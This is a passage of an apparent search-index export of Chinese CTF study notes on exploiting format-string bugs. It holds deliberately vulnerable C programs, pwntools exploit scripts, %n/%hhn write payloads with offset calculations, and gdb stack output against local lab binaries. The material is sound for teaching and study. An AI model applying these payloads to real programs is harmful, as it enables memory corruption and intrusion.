\u4e0a\u9762\u5df2\u7ecf\u5b9e\u73b0\u4f9d\u6b21\u83b7\u53d6\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u901a\u8fc7\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\uff0c\u76f4\u63a5\u83b7\u53d6\u6307\u5b9a\u4e3a\u4f4d\u7f6e\u7684\u53c2\u6570\uff1a # \u7b2cn\u4e2a\u53c2\u6570 %n$p \u53ea\u8981\u77e5\u9053\u76ee\u6807\u6570\u636e\u5728\u6808\u4e0a\u7684\u504f\u79fb n \uff0c\u5c31\u80fd\u591f\u83b7\u53d6\u3002 \u5c0f\u603b\u7ed3 \u4f1a\u7528\u6765\u6cc4\u9732\u4ec0\u4e48 \u7406\u8bba\u4e0a\u4efb\u4f55\u6808\u4e0a\u6570\u636e\u90fd\u80fd\u88ab\u6cc4\u9732\u51fa\u6765\uff0c\u76ee\u524d\u9047\u5230\u8fc7\u7684\u6709\u4ee5\u4e0b\u8fd9\u4e9b\uff1a Canary \u6cc4\u9732\u51fa Canary \u7684\u503c\uff0c\u4ece\u800c\u7ed5\u8fc7 Canary \u4fdd\u62a4\u3002 text \u6bb5\u5730\u5740 \u6cc4\u9732\u51fa text \u6bb5\u7684\u771f\u5b9e\u5730\u5740\uff0c\u4ece\u800c\u7ed5\u8fc7 PIE \u5bf9\u4e8e text \u6bb5\u7684\u4fdd\u62a4\uff0c\u4e3a ROP \u5b9e\u73b0\u63d0\u4f9b\u57fa\u7840\u3002 libc \u51fd\u6570\u5730\u5740 \u6cc4\u9732 libc \u51fd\u6570\u5730\u5740\uff0c\u83b7\u53d6 libc base addr \u3002\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u7528\u6765\u662f\u7ed5\u8fc7 PIE \u4fdd\u62a4\uff0c\u4f46\u6cc4\u9732 libc \u5730\u5740\u610f\u4e49\u4e0d\u6b62\u4e8e\u6b64\u3002 \u67d0\u4e9b\u53d8\u91cf \u6709\u4e9b\u9898\u76ee\u4f1a\u6709 if \u5224\u65ad\u8f93\u5165\u503c\u7b49\u662f\u5426\u4e0e\u9884\u5148\u8bbe\u5b9a\u7684\u503c\u76f8\u7b49\uff0c\u4ee5\u6b64\u589e\u52a0\u96be\u5ea6\u3002 \u5173\u952e\u5b57\u9009\u62e9 \u5229\u7528 %x \u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528 %p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002 \u5229\u7528 %s \u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002 \u5229\u7528 %order$x \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528 %order$s \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002 \u8986\u76d6\u5185\u5b58 \u8986\u76d6\u5185\u5b58\u4f7f\u7528\u7684 %n \u548c %c \u914d\u5408\u5b9e\u73b0\u3002 c \u7b80\u5355\u70b9\u6765\u8bf4\u5c31\u662f\u4ea7\u751f\u51e0\u4e2a null \u5b57\u7b26\u3002 n \u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u5c06\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002 \u5199\u5165\u7684\u65f6\u5019\u4e5f\u6709\u591a\u79cd\u65b9\u5f0f\uff1a n\uff1aint hn\uff1ashort int \u5199\u5165\u53cc\u5b57\u8282 hhn\uff1achar int \u5199\u5165\u5355\u5b57\u8282 \u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\uff0832\u4f4d\uff09\uff1a /* example/overflow/overflow.c */ #include <stdio.h> int a = 123, b = 456; int main() { int c = 789; char s[100]; printf(\"%p\\n\", &c); scanf(\"%s\", s); printf(s); if (c == 16) { puts(\"modified c.\"); } else if (a == 2) { puts(\"modified a for a small number.\"); } else if (b == 0x12345678) { puts(\"modified b for a big number!\"); } return 0; } \u8986\u76d6\u4efb\u610f\u5730\u5740 \u8986\u76d6\u5c0f\u6570\u5b57 \u8fd9\u91cc\u4ee5\u5c06 a \u8986\u76d6\u4e3a 2 \u4e3a\u4f8b\u3002\u9700\u8981\u5c06\u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u540e\u7f6e\uff0c\u56e0\u4e3a\u673a\u5668\u5b57\u957f\u4e3a 4 \uff0864 \u4f4d\u662f 8\uff09\u3002 \u6784\u9020\u5b57\u7b26\u4e32\u5982\u4e0b\uff1a aa%k$nxx[addr] aa \u4e24\u4e2a\u53ef\u89c1\u5b57\u7b26\uff0c\u6240\u4ee5\u6700\u540e\u4f1a\u5411\u76ee\u6807\u5730\u5740\u5199\u5165 2 \u3002 k \u76ee\u6807\u5730\u5740\u7684\u504f\u79fb\u4f4d\u7f6e\u3002 xx \u8ba9\u5b57\u7b26\u4e32\u5bf9\u5176\u673a\u5668\u5b57\u957f\uff0c\u8fd9\u91cc\u662f 4 \u3002 [addr] \u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u3002 \u600e\u4e48\u5bf9\u9f50 \u5bf9\u9f50\u65b9\u6cd5\u5728 32 64 \u7a0b\u5e8f\u4e2d\uff0c\u8986\u76d6\u5927\u6570\u5b57\u3001\u5c0f\u6570\u5b57\u4e2d\u90fd\u901a\u7528\uff0c\u4ee5\u4e0a\u9762\u8fd9\u4e2a\u4e3a\u4f8b\u3002python \u4f7f\u7528 len \u8ba1\u7b97\u957f\u5ea6\u540e\uff0c\u7528\u673a\u5668\u5b57\u957f\u53d6\u4f59\uff0c\u4f59\u6570\u5c31\u662f\u5bf9\u9f50\u957f\u5ea6\u3002 # 32\u4f4d\u673a\u5668\u5b57\u957f\uff1a4 # 64\u4f4d\u673a\u5668\u5b57\u957f\uff1a8 >>> len(\"aa%k$n\")%4 2 \u7b2c\u4e00\u4e2a\u53ef\u63a7\u5b57\u7b26\u504f\u79fb\u662f 6 \uff0c aa%k$nxx \u957f\u5ea6\u4e3a 8 \uff08\u4e0d\u4f1a\u7b97\u5c31 python len\uff09\uff0c\u6240\u4ee5 k \u504f\u79fb\u5e94\u8be5\u662f 8 \u3002 \u6784\u9020\u8986\u76d6\u5c0f\u6570\u5b57\u5229\u7528\u4ee3\u7801\uff1a def fora(): sh = process('./overwrite') a_addr = 0x0804A024 payload = 'aa%8$naa' + p32(a_addr) sh.sendline(payload) print sh.recv() sh.interactive() \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b >>>python exploit.py 0xffc1729c aaaa$\\xa0\\x0modified a for a small number. \u8986\u76d6\u5927\u6570\u5b57 \u8986\u76d6\u57fa\u672c\u7ed3\u6784\u548c\u4e0a\u9762\u5dee\u4e0d\u591a\uff0c\u533a\u522b\u662f\u901a\u5e38\u662f\u8986\u76d6\u5927\u6570\u5b57\u4f1a\u5206\u6b21\u8986\u76d6\uff0c\u907f\u514d\u4e00\u4e0b\u6570\u636e\u592a\u5927\u800c\u4e0d\u6210\u529f\uff0c\u6240\u4ee5\u4f1a\u7528\u5230\u6807\u5fd7 hhn \u6216 hn \u3002 \u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u4f8b\u9898\uff0c\u5199\u5165\u7684\u76ee\u6807\u5730\u5740\u4e3a 0x0804A028 \u3002\u4f7f\u7528\u5355\u5b57\u8282\u5199\u5165\uff08hhn\uff09\uff0c\u5199\u5165\u503c\u4e3a 0x12345678 \u3002\u53d8\u91cf\u662f\u5c0f\u7aef\u5e8f\u5b58\u50a8\uff0c\u4e5f\u5728\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u7684\uff1a \\x78\\x56\\x34\\x12 \uff0c\u7b80\u5355\u70b9\u5c31\u662f\u4ece\u53f3\u5411\u5de6\u8986\u76d6\u3002 0x0804A028 \\x78 0x0804A029 \\x56 0x0804A02a \\x34 0x0804A02b \\x12 \u4e3a\u4e86\u4e0e\u8986\u76d6\u5c0f\u6570\u5b57\u7edf\u4e00\uff0c\u907f\u514d\u8ba1\u7b97\u5730\u5740\u5360\u7528\u5b57\u957f\uff0c\u5c06\u5730\u5740\u653e\u7f6e\u5728\u5b57\u7b26\u4e32\u672b\u5c3e\uff0c\u5f97\u51fa\u4ee5\u4e0b\u6846\u67b6\uff1a # \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 payload=\"%xc%y$hhn%xc%y$hhn%xc%y$hhn%xc%y$hhn\" # \u76ee\u6807\u5730\u5740 payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3) x \u63a7\u5236\u8f93\u51fa\u591a\u5c11\u4e2a null \u5b57\u7b26\u3002 y \u5199\u5165\u5730\u5740\u7684\u504f\u79fb\u91cf\u3002 \u624b\u5de5\u8ba1\u7b97 c \u751f\u6210\u5b57\u7b26\u6570 \u5199\u5165\u987a\u5e8f\u4e3a\uff1a0x78\u30010x56\u30010x34\u30010x12 \u9700\u8981\u5199\u51650x78\uff0c\u5df2\u7ecf\u5b58\u50a80x0\u5b57\u7b26 0x78=120 x1=120 --- \u9700\u8981\u5199\u51650x56\uff0c\u5df2\u7ecf\u5b58\u50a80x78\u5b57\u7b26 0x156\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x56 0x156-0x78=222 x2=222 --- \u9700\u8981\u5199\u51650x34\uff0c\u5df2\u7ecf\u5b58\u50a80x156\u5b57\u7b26 0x234\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x34 0x234-0x156=222 x3=222 --- \u9700\u8981\u5199\u51650x12\uff0c\u5df2\u7ecf\u5b58\u50a80x234\u5b57\u7b26 0x312\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x12 0x312-0x234=222 x4=222 --- \u5f97\u5230\u7ed3\u679c\uff1a payload=\"%120c%y$hhn%222c%y$hhn%222c%y$hhn%222c%y$hhn\" \uff0c\u957f\u5ea6\u662f 44 \uff0c\u9884\u4f30\u5730\u5740\u504f\u79fb\u662f\u4e24\u4f4d\u6570\u5b57\uff0c\u518d\u8fdb\u884c\u4e00\u4e0b\u4fee\u6539\uff0c\u8ba1\u7b97\u5bf9\u9f50\u957f\u5ea6\u4e3a 0 \uff0c\u6700\u540e payload \u4e3a\uff1a payload=\"%120c%18$hhn%222c%19$hhn%222c%20$hhn%222c%21$hhn\" payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3) \u8986\u76d6\u6808\u5185\u5b58 \u786e\u5b9a\u8986\u76d6\u5730\u5740 \u8986\u76d6\u90a3\u91cc\u5185\u5bb9\u90fd\u597d\uff0c\u8986\u76d6\u5730\u5740\u80af\u5b9a\u8981\u660e\u786e\u7684\uff0c\u8986\u76d6\u6808\u4e0a\u53d8\u91cf\u4e5f\u662f\u9700\u8981\u7684\u3002\u53d8\u91cf\u5730\u5740\u4e00\u822c\u4f1a\u5b58\u653e\u5728\u6808\u4e0a\uff0c\u6211\u4eec\u5c31\u9700\u8981\u627e\u5230\u6808\u5b58\u653e\u8fd9\u4e2a\u53d8\u91cf\u5730\u5740\u7684\u504f\u79fb\u3002 \u786e\u5b9a\u76f8\u5bf9\u504f\u79fb \u8c03\u8bd5\u5728 printf \u6253\u65ad\u70b9\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcd0c', 'l8'] 8 0xffffcd0c\u2502+0x00: 0x080484d7 \u2192 <main+76> add esp, 0x10 \u2190 $esp 0xffffcd10\u2502+0x04: 0xffffcd28 \u2192 \"%d%d\" 0xffffcd14\u2502+0x08: 0xffffcd8c \u2192 0x00000315 0xffffcd18\u2502+0x0c: 0x000000c2 0xffffcd1c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd20\u2502+0x14: 0xffffcd4e \u2192 0xffff0000 \u2192 0x00000000 0xffffcd24\u2502+0x18: 0xffffce4c \u2192 0xffffd07a \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd28\u2502+0x1c: \"%d%d\" \u2190 $eax \u5728 0xffffcd14 \u5904\u5b58\u50a8\u7740\u53d8\u91cf c \u7684\u5730\u5740\u3002\u504f\u79fb\u91cf\u4e3a 6 \u3002 \u8fdb\u884c\u8986\u76d6 \u8fd9\u6837\uff0c\u7b2c 6 \u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cf c \u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528 %n \u7684\u7279\u5f81\u6765\u4fee\u6539 c \u7684\u503c\u3002payload \u5982\u4e0b [addr of c]%012d%6$n addr of c \u7684\u957f\u5ea6\u4e3a 4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u5165 12 \u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u5230 16 \u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539 c \u7684\u503c\u4e3a 16\u3002 \u5177\u4f53\u811a\u672c\u5982\u4e0b def forc(): sh = process('./overwrite') c_addr = int(sh.recvuntil('\\n', drop=True), 16) print hex(c_addr) payload = p32(c_addr) + '%012d' + '%6$n' print payload #gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive() forc() \u7ed3\u679c\u5982\u4e0b \u279c overwrite git:(master) \u2717 python exploit.py [+] Starting local process './overwrite': pid 74806 0xfffd8cdc \u070c\ufffd\ufffd%012d%6$n \u070c\ufffd\ufffd-00000160648modified c.","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528"},{"location":"fmtstr/fmtstr_exploit/#_1","text":"\u9605\u8bfb ctf-wiki \u540e\u603b\u7ed3","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528"},{"location":"fmtstr/fmtstr_exploit/#_2","text":"\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c \u6cc4\u9732\u6808\u5185\u5b58 \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58 \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u5229\u7528 GOT \u8868\u5f97\u5230 libc \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6 libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83 libc \u51fd\u6570\u5730\u5740 \u76f2\u6253\uff0cdump \u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002","title":"\u6cc4\u9732\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_3","text":"\u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f #include <stdio.h> # file:leakmemory.c int main() { char s[100]; int a = 1, b = 0x22222222, c = -1; scanf(\"%s\", s); printf(\"%08x.%08x.%08x.%s\\n\", a, b, c, s); printf(s); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e return 0; } 32 \u4f4d\u7a0b\u5e8f\u4f7f\u7528\u7684\u662f\u6808\u4f20\u53c2\uff0c64 \u4f4d\u7cfb\u7edf\u524d 7 \u4e2a\u53c2\u6570\u662f\u7528\u5bc4\u5b58\u5668\u4f20\u53c2\u300232 \u4f4d\u7a0b\u5e8f\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6cc4\u9732\u51fa\u5b58\u5728\u6808\u4e0a\u7684\u53c2\u6570\u3002\uff0864 \u4f4d\u8981\u5bf9\u5e94\u8c03\u6574\uff09 \u7f16\u8bd1 32 \u4f4d\u7a0b\u5e8f\uff1a gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c \u8f93\u5165\u8f93\u51fa\u5982\u4e0b\uff1a >>>%p.%p.%p 00000001.22222222.ffffffff.%p.%p.%p 0xffffcd10.0xc2.0xf7e8b6bb \u6808\u60c5\u51b5\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffccfc', 'l8'] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" # \u5f00\u59cb\u6cc4\u9732\u4f4d\u7f6e 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"%08x.%08x.%08x\" \u2190 $eax 0xffffcd14\u2502+0x18: \".%08x.%08x\" 0xffffcd18\u2502+0x1c: \"x.%08x\"","title":"\u7b80\u5355\u7684\u6cc4\u9732\u6808\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_4","text":"\u4e0a\u9762\u5df2\u7ecf\u5b9e\u73b0\u4f9d\u6b21\u83b7\u53d6\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u901a\u8fc7\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\uff0c\u76f4\u63a5\u83b7\u53d6\u6307\u5b9a\u4e3a\u4f4d\u7f6e\u7684\u53c2\u6570\uff1a # \u7b2cn\u4e2a\u53c2\u6570 %n$p \u53ea\u8981\u77e5\u9053\u76ee\u6807\u6570\u636e\u5728\u6808\u4e0a\u7684\u504f\u79fb n \uff0c\u5c31\u80fd\u591f\u83b7\u53d6\u3002","title":"\u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_5","text":"","title":"\u5c0f\u603b\u7ed3"},{"location":"fmtstr/fmtstr_exploit/#_6","text":"\u7406\u8bba\u4e0a\u4efb\u4f55\u6808\u4e0a\u6570\u636e\u90fd\u80fd\u88ab\u6cc4\u9732\u51fa\u6765\uff0c\u76ee\u524d\u9047\u5230\u8fc7\u7684\u6709\u4ee5\u4e0b\u8fd9\u4e9b\uff1a Canary \u6cc4\u9732\u51fa Canary \u7684\u503c\uff0c\u4ece\u800c\u7ed5\u8fc7 Canary \u4fdd\u62a4\u3002 text \u6bb5\u5730\u5740 \u6cc4\u9732\u51fa text \u6bb5\u7684\u771f\u5b9e\u5730\u5740\uff0c\u4ece\u800c\u7ed5\u8fc7 PIE \u5bf9\u4e8e text \u6bb5\u7684\u4fdd\u62a4\uff0c\u4e3a ROP \u5b9e\u73b0\u63d0\u4f9b\u57fa\u7840\u3002 libc \u51fd\u6570\u5730\u5740 \u6cc4\u9732 libc \u51fd\u6570\u5730\u5740\uff0c\u83b7\u53d6 libc base addr \u3002\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u7528\u6765\u662f\u7ed5\u8fc7 PIE \u4fdd\u62a4\uff0c\u4f46\u6cc4\u9732 libc \u5730\u5740\u610f\u4e49\u4e0d\u6b62\u4e8e\u6b64\u3002 \u67d0\u4e9b\u53d8\u91cf \u6709\u4e9b\u9898\u76ee\u4f1a\u6709 if \u5224\u65ad\u8f93\u5165\u503c\u7b49\u662f\u5426\u4e0e\u9884\u5148\u8bbe\u5b9a\u7684\u503c\u76f8\u7b49\uff0c\u4ee5\u6b64\u589e\u52a0\u96be\u5ea6\u3002","title":"\u4f1a\u7528\u6765\u6cc4\u9732\u4ec0\u4e48"},{"location":"fmtstr/fmtstr_exploit/#_7","text":"\u5229\u7528 %x \u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528 %p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002 \u5229\u7528 %s \u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002 \u5229\u7528 %order$x \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528 %order$s \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002","title":"\u5173\u952e\u5b57\u9009\u62e9"},{"location":"fmtstr/fmtstr_exploit/#_8","text":"\u8986\u76d6\u5185\u5b58\u4f7f\u7528\u7684 %n \u548c %c \u914d\u5408\u5b9e\u73b0\u3002 c \u7b80\u5355\u70b9\u6765\u8bf4\u5c31\u662f\u4ea7\u751f\u51e0\u4e2a null \u5b57\u7b26\u3002 n \u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u5c06\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002 \u5199\u5165\u7684\u65f6\u5019\u4e5f\u6709\u591a\u79cd\u65b9\u5f0f\uff1a n\uff1aint hn\uff1ashort int \u5199\u5165\u53cc\u5b57\u8282 hhn\uff1achar int \u5199\u5165\u5355\u5b57\u8282 \u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\uff0832\u4f4d\uff09\uff1a /* example/overflow/overflow.c */ #include <stdio.h> int a = 123, b = 456; int main() { int c = 789; char s[100]; printf(\"%p\\n\", &c); scanf(\"%s\", s); printf(s); if (c == 16) { puts(\"modified c.\"); } else if (a == 2) { puts(\"modified a for a small number.\"); } else if (b == 0x12345678) { puts(\"modified b for a big number!\"); } return 0; }","title":"\u8986\u76d6\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_9","text":"","title":"\u8986\u76d6\u4efb\u610f\u5730\u5740"},{"location":"fmtstr/fmtstr_exploit/#_10","text":"\u8fd9\u91cc\u4ee5\u5c06 a \u8986\u76d6\u4e3a 2 \u4e3a\u4f8b\u3002\u9700\u8981\u5c06\u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u540e\u7f6e\uff0c\u56e0\u4e3a\u673a\u5668\u5b57\u957f\u4e3a 4 \uff0864 \u4f4d\u662f 8\uff09\u3002 \u6784\u9020\u5b57\u7b26\u4e32\u5982\u4e0b\uff1a aa%k$nxx[addr] aa \u4e24\u4e2a\u53ef\u89c1\u5b57\u7b26\uff0c\u6240\u4ee5\u6700\u540e\u4f1a\u5411\u76ee\u6807\u5730\u5740\u5199\u5165 2 \u3002 k \u76ee\u6807\u5730\u5740\u7684\u504f\u79fb\u4f4d\u7f6e\u3002 xx \u8ba9\u5b57\u7b26\u4e32\u5bf9\u5176\u673a\u5668\u5b57\u957f\uff0c\u8fd9\u91cc\u662f 4 \u3002 [addr] \u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u3002","title":"\u8986\u76d6\u5c0f\u6570\u5b57"},{"location":"fmtstr/fmtstr_exploit/#_11","text":"\u5bf9\u9f50\u65b9\u6cd5\u5728 32 64 \u7a0b\u5e8f\u4e2d\uff0c\u8986\u76d6\u5927\u6570\u5b57\u3001\u5c0f\u6570\u5b57\u4e2d\u90fd\u901a\u7528\uff0c\u4ee5\u4e0a\u9762\u8fd9\u4e2a\u4e3a\u4f8b\u3002python \u4f7f\u7528 len \u8ba1\u7b97\u957f\u5ea6\u540e\uff0c\u7528\u673a\u5668\u5b57\u957f\u53d6\u4f59\uff0c\u4f59\u6570\u5c31\u662f\u5bf9\u9f50\u957f\u5ea6\u3002 # 32\u4f4d\u673a\u5668\u5b57\u957f\uff1a4 # 64\u4f4d\u673a\u5668\u5b57\u957f\uff1a8 >>> len(\"aa%k$n\")%4 2 \u7b2c\u4e00\u4e2a\u53ef\u63a7\u5b57\u7b26\u504f\u79fb\u662f 6 \uff0c aa%k$nxx \u957f\u5ea6\u4e3a 8 \uff08\u4e0d\u4f1a\u7b97\u5c31 python len\uff09\uff0c\u6240\u4ee5 k \u504f\u79fb\u5e94\u8be5\u662f 8 \u3002 \u6784\u9020\u8986\u76d6\u5c0f\u6570\u5b57\u5229\u7528\u4ee3\u7801\uff1a def fora(): sh = process('./overwrite') a_addr = 0x0804A024 payload = 'aa%8$naa' + p32(a_addr) sh.sendline(payload) print sh.recv() sh.interactive() \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b >>>python exploit.py 0xffc1729c aaaa$\\xa0\\x0modified a for a small number.","title":"\u600e\u4e48\u5bf9\u9f50"},{"location":"fmtstr/fmtstr_exploit/#_12","text":"\u8986\u76d6\u57fa\u672c\u7ed3\u6784\u548c\u4e0a\u9762\u5dee\u4e0d\u591a\uff0c\u533a\u522b\u662f\u901a\u5e38\u662f\u8986\u76d6\u5927\u6570\u5b57\u4f1a\u5206\u6b21\u8986\u76d6\uff0c\u907f\u514d\u4e00\u4e0b\u6570\u636e\u592a\u5927\u800c\u4e0d\u6210\u529f\uff0c\u6240\u4ee5\u4f1a\u7528\u5230\u6807\u5fd7 hhn \u6216 hn \u3002 \u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u4f8b\u9898\uff0c\u5199\u5165\u7684\u76ee\u6807\u5730\u5740\u4e3a 0x0804A028 \u3002\u4f7f\u7528\u5355\u5b57\u8282\u5199\u5165\uff08hhn\uff09\uff0c\u5199\u5165\u503c\u4e3a 0x12345678 \u3002\u53d8\u91cf\u662f\u5c0f\u7aef\u5e8f\u5b58\u50a8\uff0c\u4e5f\u5728\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u7684\uff1a \\x78\\x56\\x34\\x12 \uff0c\u7b80\u5355\u70b9\u5c31\u662f\u4ece\u53f3\u5411\u5de6\u8986\u76d6\u3002 0x0804A028 \\x78 0x0804A029 \\x56 0x0804A02a \\x34 0x0804A02b \\x12 \u4e3a\u4e86\u4e0e\u8986\u76d6\u5c0f\u6570\u5b57\u7edf\u4e00\uff0c\u907f\u514d\u8ba1\u7b97\u5730\u5740\u5360\u7528\u5b57\u957f\uff0c\u5c06\u5730\u5740\u653e\u7f6e\u5728\u5b57\u7b26\u4e32\u672b\u5c3e\uff0c\u5f97\u51fa\u4ee5\u4e0b\u6846\u67b6\uff1a # \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 payload=\"%xc%y$hhn%xc%y$hhn%xc%y$hhn%xc%y$hhn\" # \u76ee\u6807\u5730\u5740 payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3) x \u63a7\u5236\u8f93\u51fa\u591a\u5c11\u4e2a null \u5b57\u7b26\u3002 y \u5199\u5165\u5730\u5740\u7684\u504f\u79fb\u91cf\u3002","title":"\u8986\u76d6\u5927\u6570\u5b57"},{"location":"fmtstr/fmtstr_exploit/#c","text":"\u5199\u5165\u987a\u5e8f\u4e3a\uff1a0x78\u30010x56\u30010x34\u30010x12 \u9700\u8981\u5199\u51650x78\uff0c\u5df2\u7ecf\u5b58\u50a80x0\u5b57\u7b26 0x78=120 x1=120 --- \u9700\u8981\u5199\u51650x56\uff0c\u5df2\u7ecf\u5b58\u50a80x78\u5b57\u7b26 0x156\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x56 0x156-0x78=222 x2=222 --- \u9700\u8981\u5199\u51650x34\uff0c\u5df2\u7ecf\u5b58\u50a80x156\u5b57\u7b26 0x234\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x34 0x234-0x156=222 x3=222 --- \u9700\u8981\u5199\u51650x12\uff0c\u5df2\u7ecf\u5b58\u50a80x234\u5b57\u7b26 0x312\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x12 0x312-0x234=222 x4=222 --- \u5f97\u5230\u7ed3\u679c\uff1a payload=\"%120c%y$hhn%222c%y$hhn%222c%y$hhn%222c%y$hhn\" \uff0c\u957f\u5ea6\u662f 44 